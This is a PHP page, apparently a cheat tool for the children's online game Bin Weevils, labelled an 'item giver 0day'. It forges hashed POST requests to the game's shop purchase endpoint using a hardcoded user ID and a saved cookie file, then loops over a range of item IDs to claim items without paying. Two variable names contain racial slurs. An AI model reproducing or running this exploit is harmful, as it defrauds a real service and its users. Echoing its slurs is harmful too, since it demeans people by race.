<?php
$title = "Weevil lookup - BWI";
include_once('header.php');
?>
<div class="container">
<div class="content">
<h1>amount</h1>
<?php
	include_once('utils.php');#
	makevalidsession();
	checkmulchandexp();

	var_dump($OUTPUTYOUBLACKNIGER);
?>
<h1>item giver 0day</h1>
<br />
<?php

		function shopbuytoken($itemID) {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/shop/buyTokenItem.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 216253239; // need to change idx bobbyfisher.hol.es/weevilinfo.php
		$timer = 317685;
		$tokens = 10;
		$hash = o2_genhash($idx.$itemID.$timer.$tokens);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&itemID=".$itemID."&hash=".$hash."&timer=".$timer."&tokens=".$tokens);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
}

 foreach (range(3500, 3600) as $itemID) {
    shopbuytoken($itemID);
    var_dump($outputnigga);
 }


?>
</div>
</div>
<?php
include_once('footer.php');
?>